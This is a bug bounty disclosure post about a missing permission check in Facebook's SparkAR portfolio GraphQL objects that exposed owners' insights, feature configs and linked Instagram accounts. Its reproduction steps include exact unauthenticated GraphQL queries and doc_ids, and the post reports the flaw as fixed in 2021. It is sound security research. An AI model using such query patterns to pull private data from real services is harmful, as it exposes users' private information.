---
id: 621
title: 'Access private information about SparkAR effect owners who has a publicly viewable portfolio'
date: '2021-02-17T09:46:02+00:00'
author: qw
layout: post
guid: 'https://ysamm.com/?p=621'
wp_featherlight_disable:
    - ''
categories:
    - Uncategorized
---

**Description**

This bug could allow a malicious user to access private information about a SparkAR effect owner who has published his/her portfolio in <https://www.facebook.com/sparkarhub/gallery/>. Due to missing permissions checking in the ARCreatorProfile object which insecurely make a Connection to an AREffectOwner object , an attacker can access information about the effect owner like enabled/disabled features, surface configs, insights , test groups and sections. Also, i found that it’s possible to leak linked Instagram account of a page if the page has a publicly viewable portfolio. This was due to a misconfigured (ACLs) connection in the field “effect_owner”.

**Reproduction Steps**

Make a POST request to <https://www.facebook.com/api/graphql/> without cookies and with this in the request body:

q=node(PROFILE_ID){effect_owner{insights_v2{impressions{total,timeline{time,value}},opens{total,timeline{time,value}}}}}}   
where PROFILE_ID is the id of the portfolio/profile (GraphQL obj ARCreatorProfile).

This particular query would only return some insights but more detailed ones could be returned (like engagements).

Same thing could be done to surface configs or enabled features in the account (This could be used to identify employees).

q=node(PROFILE_ID){effect_owner{surface_configs{surface,is_unified_publishing_enabled,capabilities_surface,usecase,is_arexport_file_enabled,is_effect_name_enabled,is_thumbnail_enabled,is_preview_video_enabled,is_screencast_enabled,is_review_description_enabled,is_category_enabled,is_attribution_enabled,is_thumbnail_cropping_tool_enabled,are_review_appeals_enabled,effect_name_max_length,arfx_max_size,ar_export_max_size,is_guidance_enabled,is_ig_attribution_enabled,attribution_types_supported,category_max_num,is_tags_enabled,is_preview_video_capture_link_enabled,is_scheduling_enabled,is_location_targeting_enabled,is_dogfooding_enabled,is_legal_agreement_enabled,is_ads_legal_agreement_enabled}}}

q=node(PROFILE_ID){effect_owner{is_ar_manager}}

q=node(PROFILE_ID){effect_owner{test_groups{nodes{id}}}}

q=node(PROFILE_ID){effect_owner{sections{nodes{id}}}}

**Leaking Instagram account linked to a page**

As a Page actor, visit <https://www.facebook.com/sparkarhub/portfolios/me/>. Click on “Edit profile”, and uncheck the option to show Instagram or Facebook.

As a second user, visit [https://www.facebook.com/sparkarhub/portfolios/{PROFILE_ID}/](https://www.facebook.com/sparkarhub/portfolios/%7BPROFILE_ID%7D/) and you’ll not get the IG or FB account.

The graphql query to get portfolio information is the one with doc_id=3716679588376054 which would contain a field visible_ig_accounts that shows the ig account based on the user choice (variables={“profileId”:”PROFILE_ID”}&amp;doc_id=3716679588376054) .   
However, the owner editing query of the portfolio would contain another field “**linked_ig**” which always would return linked IG account of the page/user. The attacker would simply use this graphql query against a publicly viewable portfolio and get the IG account linked. So two ways to reproduce this:

Send a POST request to [www.facebook.com/api/graphql/](https://www.facebook.com/api/graphql/) without cookies and with this in the body:

variables={“profileId”:”PROFILE_ID”}&amp;  
doc_id=3798020423541326  
and you should get the id of the Instagram account in “linked_ig” field.

**Timeline**

Dec 10, 2020— Report Sent   
Dec 30, 2020— Acknowledged by Facebook  
Jan 11, 2021— Fixed by Facebook  
Feb 1, 2021 — $1500 bounty awarded by Facebook.